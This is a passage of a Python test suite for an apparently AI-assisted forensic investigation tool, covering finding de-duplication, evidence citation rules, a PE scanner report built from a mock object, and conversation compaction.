            self._synth(["PsExec CONFIRMED finding lacks a cited physical execution artifact", "The ransom-note URL is not quoted verbatim from tool output"]),
            {"type": "tool_call", "success": True, "cmd": "strings -a x"},
            self._synth(["PsExec finding still lacks a cited physical execution artifact (amcache/prefetch)", "Timeline gap between 12:30 and 13:30 is unexplained"]),
        ]
        persisted, fresh = _split_persisted_blockers(entries, "- PsExec finding still lacks a cited physical execution artifact (amcache/prefetch)\n- Timeline gap between 12:30 and 13:30 is unexplained")
        assert persisted and "PsExec" in persisted[0]
        assert fresh == ["Timeline gap between 12:30 and 13:30 is unexplained"]

    def test_no_work_between_syntheses_keeps_blockers_as_tasks(self):
        from tools.reasoning import _split_persisted_blockers
        entries = [self._synth(["A gap"]), self._synth(["A gap"])]
        persisted, fresh = _split_persisted_blockers(entries, "- A gap that is long enough")
        assert not persisted and fresh


class TestVenvBinOnPath:
    def test_interpreter_bin_dir_is_prepended_once(self, monkeypatch):
        import sys
        from core.paths import ensure_venv_on_path
        monkeypatch.setenv("PATH", "/usr/bin:/bin")
        path = ensure_venv_on_path()
        bin_dir = os.path.join(sys.prefix, "bin")
        assert path.split(os.pathsep)[0] == bin_dir
        assert ensure_venv_on_path().count(bin_dir) == 1

    def test_missing_program_is_a_clear_refusal(self, monkeypatch):
        import tools.misc as misc
        monkeypatch.setattr(misc, "_bin_or_warn", lambda name: None)
        out = misc.usnparser_parse("/x/$J")
        assert out["success"] is False and "not installed" in out["error"]


class TestPeScannerReport:
    def test_report_from_a_parsed_pe(self, tmp_path):
        from tools.misc import _pe_report

        class Sec:
            def __init__(self, name, data, flags, offset):
                self.Name = name; self._d = data; self.Characteristics = flags
                self.Misc_VirtualSize = len(data); self.SizeOfRawData = len(data)
                self.PointerToRawData = offset
            def get_data(self): return self._d

        class Imp:
            def __init__(self, n): self.name = n

        class Entry:
            def __init__(self, dll, names): self.dll = dll; self.imports = [Imp(n) for n in names]

        class PE:
            class OPTIONAL_HEADER: Subsystem = 2; AddressOfEntryPoint = 0x1000; ImageBase = 0x400000
            class FILE_HEADER: TimeDateStamp = 1927976400; Machine = 0x8664
            sections = [Sec(b".text\x00", bytes(range(256)) * 16, 0x60000020, 0x400), Sec(b".rwx\x00", b"A" * 64, 0xE0000020, 0x400 + 4096)]
            DIRECTORY_ENTRY_IMPORT = [Entry(b"KERNEL32.dll", [b"VirtualAllocEx", b"CreateRemoteThread", b"ReadFile"])]
            def is_dll(self): return False
            def is_driver(self): return False
        f = tmp_path / "x.exe"; f.write_bytes(b"\0" * (0x400 + 4096 + 64 + 100))
        rep = _pe_report(PE(), str(f))
        assert rep["success"] and rep["compile_timestamp_utc"].startswith("2031-02-04")
        assert "VirtualAlloc" in rep["apis_of_interest"] and "CreateRemoteThread" in rep["apis_of_interest"]
        assert any("high-entropy" in h for h in rep["hints"]) and any("writable+executable" in h for h in rep["hints"])
        assert rep["overlay_bytes"] == 100


class TestFreshInstallPathSetup:
    def test_service_template_and_launcher_put_the_venv_on_path(self):
        from pathlib import Path
        unit = Path("share/atlas-dashboard.service.in").read_text()
        assert "Environment=PATH=@VENV_BIN@:" in unit
        assert "@VENV_BIN@" in Path("install.sh").read_text()
        launcher = Path("bin/atlas-dashboard").read_text()
        assert 'export PATH="$(dirname "$VENV_PY")' in launcher
        reqs = Path("requirements.txt").read_text()
        assert "pefile" in reqs and "usnparser" in reqs and "libscca-python" in reqs


# ── one finding, once: the anchors real findings actually carry ───────────

def test_anchors_recognise_addresses_principals_and_written_dates():
    """The vocabulary was ISO timestamps, SIDs, hashes and GUIDs only, so a
    finding written the way an analyst writes one yielded no anchor at all
    and the same sessions were recorded twice."""
    from core.claim_graph import anchors_agree, statement_anchor_kinds

    a = statement_anchor_kinds(
        "user01 RDP sessions from external addresses on WS-EXAMPLE: "
        "(1) Feb 4 12:05 from 198.51.100.4 (EID 1149), "
        "(2) Feb 6 17:30 from 198.51.100.2")
    b = statement_anchor_kinds(
        "user01 external RDP sessions to WS-EXAMPLE from non-standard "
        "segments: (1) Feb 4 12:05 from 198.51.100.4 (TS EID 1149), "
        "(2) Feb 6 17:30 from 198.51.100.2")
    assert ("addr", "198.51.100.4") in a
    assert ("time_m", "feb 4 12:05") in a
    assert anchors_agree(a, b), "the same two sessions, rewritten"

    # A DOMAIN\account is an identifier however the JSON escaped it.
    single = statement_anchor_kinds(r"Logon by EXAMPLE\tempadmin at 03:00")
    doubled = statement_anchor_kinds(r"Logon by EXAMPLE\\tempadmin at 03:00")
    assert single & doubled


def test_two_anchors_of_one_kind_are_not_one_finding():
    """Traffic between the same pair of addresses is not one event."""
    from core.claim_graph import anchors_agree, statement_anchor_kinds

    rdp = statement_anchor_kinds(
        "RDP from 198.51.100.4 to 203.0.113.9 during the intrusion window")
    smb = statement_anchor_kinds(
        "SMB file copy from 198.51.100.4 to 203.0.113.9 two days earlier")
    assert not anchors_agree(rdp, smb)

    # The original strict kinds still merge on their own.
    one = statement_anchor_kinds(
        "Account created 2031-02-04 12:00:00 by S-1-5-21-1-2-3-500")
    two = statement_anchor_kinds(
        "At 2031-02-04 12:00:00 S-1-5-21-1-2-3-500 created the account")
    assert anchors_agree(one, two)


def test_a_refused_call_is_not_supporting_evidence(tmp_path):
    """A refused coverage call must never be cited as support for a claim.

    Context ids are what the model was looking at; they are copied into the
    claim's evidence unexamined, so a call that never produced anything must
    not survive that copy.
    """
    import core.execution_log as elog
    from core.claim_graph import _evidence_from_finding

    elog.log.configure("EVIDCHK", str(tmp_path / "trace.json"),
                       save_session=False)
    elog.log._entries.extend([
        {"call_id": 170, "type": "tool_call", "success": True,
         "cmd": "<py>:table_table_grep"},
        {"call_id": 173, "type": "tool_call", "success": False,
         "cmd": "<py>:coverage_mark_blocked",
         "stderr": "no coverage-ledger unit matches path"},
    ])

    items = _evidence_from_finding(
        source="table.table_grep", supporting_evidence="",
        linked_call_id=170, input_call_ids=[170, 173],
    )
    cited = {i.get("call_id") for i in items}
    assert 170 in cited
    assert 173 not in cited, "a refusal is evidence of nothing but the refusal"


def test_a_file_path_is_not_a_principal_and_a_version_is_not_an_address():
    """Widening the anchor vocabulary must not invent identifiers.

    "C:\\Users\\bob\\enc.exe" carries "Users\\bob"; two different facts about
    one user's files would otherwise share an identifier and be merged.
    """
    from core.claim_graph import anchors_agree, statement_anchor_kinds

    kinds = lambda t: {k for k, _v in statement_anchor_kinds(t)}
    assert "principal" not in kinds(
        r"Encryptor written to C:\Users\bob\Desktop\enc.exe at 2026-01-02 10:00")
    assert "principal" not in kinds(
        r"Copied from \\FILESRV\share\docs at 2026-01-02 10:00")
    assert "principal" in kinds(r"Logon by EXAMPLE\tempadmin at 2026-01-02 10:00")
    assert "principal" in kinds(r"Logon by EXAMPLE\WS01$ at 2026-01-02 10:00")
    # A four-part version number is not a dotted quad.
    assert "addr" not in kinds("Chrome 10.0.19041.1 installed at 2026-01-02 10:00")

    a = statement_anchor_kinds(
        r"Encryptor written to C:\Users\bob\Desktop\enc.exe at 2026-01-02 10:00")
    b = statement_anchor_kinds(
        r"Persistence key at C:\Users\bob\AppData\run.exe at 2026-01-02 10:00")
    assert not anchors_agree(a, b), "two facts about one user's files are two facts"


def test_a_deferred_finish_is_not_reported_as_silence():
    """The model called atlas_finish, the loop held it back for the report,
    and nothing followed — the run ended because it believed it was done,
    not because it went quiet. "quiet" told the operator the opposite."""
    from core.investigation_exit import classify_finish_status

    # The label is graded like the other quiet stops, not passed through as
    # if it were a finish status of its own.
    graded = classify_finish_status(
        stopped_reason="finish_deferred", case_dir=None,
        report_written=False, synthesize_ok=False, pre_report_ready=False)
    assert graded != "finish_deferred"
    assert graded == classify_finish_status(
        stopped_reason="quiet", case_dir=None,
        report_written=False, synthesize_ok=False, pre_report_ready=False)


# ── context: the compaction cadence is measured in turns ─────────────────

def _conv_turns(turns: int, calls_per_turn: int, tool_chars: int = 3000) -> list[dict]:
    msgs = [{"role": "system", "content": "playbook"},
            {"role": "user", "content": "case brief " * 20}]
    for t in range(turns):
        calls = [{"id": f"c{t}_{k}", "type": "function",
                  "function": {"name": "x", "arguments": "{}"}} for k in range(calls_per_turn)]
        msgs.append({"role": "assistant", "content": f"thinking about turn {t} " * 10,
                     "tool_calls": calls})
        for k in range(calls_per_turn):
            msgs.append({"role": "tool", "tool_call_id": f"c{t}_{k}", "content": "r" * tool_chars})
    return msgs


def _compaction_turns(calls_per_turn: int, turns: int = 24) -> list[int]:
    """The turns at which compaction fired while a conversation grew one
    turn at a time, the way the loop calls it."""
    from core.llm_check import compact_aged_messages
    msgs = [{"role": "system", "content": "playbook"},
            {"role": "user", "content": "case brief " * 20}]
    fired = []
    for t in range(1, turns + 1):
        msgs.extend(_conv_turns(1, calls_per_turn)[2:])
        if compact_aged_messages(msgs, keep_tool_turns=4, batch_turns=6):
            fired.append(t)
    return fired


def test_compaction_cadence_does_not_depend_on_calls_per_turn():
    """One call a turn or four: the prefix moves at the same turns."""
    assert _compaction_turns(1) == _compaction_turns(4) == _compaction_turns(3)
    fired = _compaction_turns(1)
    assert fired and fired[0] == 10                    # 4 kept + 6 due
    assert all(b - a == 6 for a, b in zip(fired, fired[1:]))


def test_the_last_turns_results_are_kept_whole_and_prose_moves_in_the_same_pass():
    from core.llm_check import _TOOL_STUB, _TURN_STUB, compact_aged_messages, turn_index
    msgs = _conv_turns(24, 3)
    n = compact_aged_messages(msgs, keep_tool_turns=4, batch_turns=6)
    assert n > 0
    turns = turn_index(msgs)
    for i, m in enumerate(msgs):
        if m["role"] == "tool":
            assert (m["content"] == _TOOL_STUB) == (turns[i] <= 24 - 4)
    # older prose shortened in the same pass, not left for a second move
    assert any(m["content"] == _TURN_STUB for m in msgs if m["role"] == "assistant")
    assert compact_aged_messages(msgs, keep_tool_turns=4, batch_turns=6) == 0


def test_message_count_mode_is_unchanged_when_turn_knobs_are_absent():
    from core.llm_check import compact_aged_messages
    msgs = _conv_turns(20, 1)
    n = compact_aged_messages(msgs, keep_tool_results=12, keep_turn_text=16, batch=6)
    tools = [m for m in msgs if m["role"] == "tool"]
    assert n > 0 and all(len(m["content"]) == 3000 for m in tools[-12:])


def test_a_borrowed_value_cites_its_call_and_unrelated_output_is_not_borrowed(tmp_path, monkeypatch):
    """A value the cited calls lack is taken from a recent call about the
    same artifacts, and that call joins the lineage; output about other
    artifacts is not searched when the description names its own."""
    from core.execution_log import ExecutionLog
    from tools.misc import _auto_fill_supporting_evidence
    case = tmp_path / "C"; (case / "analysis").mkdir(parents=True)
    log = ExecutionLog(); log.configure("C", str(case / "analysis" / "trace.json"), save_session=False)
    monkeypatch.setattr("core.execution_log.log", log)
    cited = log.record_tool_call("<py>:table_table_query", True, False, 0, 0,
                                 stdout_excerpt="exports/proxy_access.csv: 12 rows for CORP-WS01")
    other = log.record_tool_call("<py>:table_table_query", True, False, 0, 0,
                                 stdout_excerpt="exports/dns_cache.csv: 203.0.113.9 resolved for CORP-WS02")
    desc = "proxy_access.csv shows CORP-WS01 reaching 203.0.113.9."
    kw = dict(description=desc, supporting_evidence="", input_call_ids=[cited], linked_call_id=cited, log=log)
    filled, added = _auto_fill_supporting_evidence(**kw)
    assert "203.0.113.9" not in filled and added == []
    related = log.record_tool_call("<py>:table_table_query", True, False, 0, 0,
                                   stdout_excerpt="exports/proxy_access.csv: CONNECT 203.0.113.9:443")
    filled, added = _auto_fill_supporting_evidence(**kw)
    assert "203.0.113.9" in filled and added == [related] and other not in added
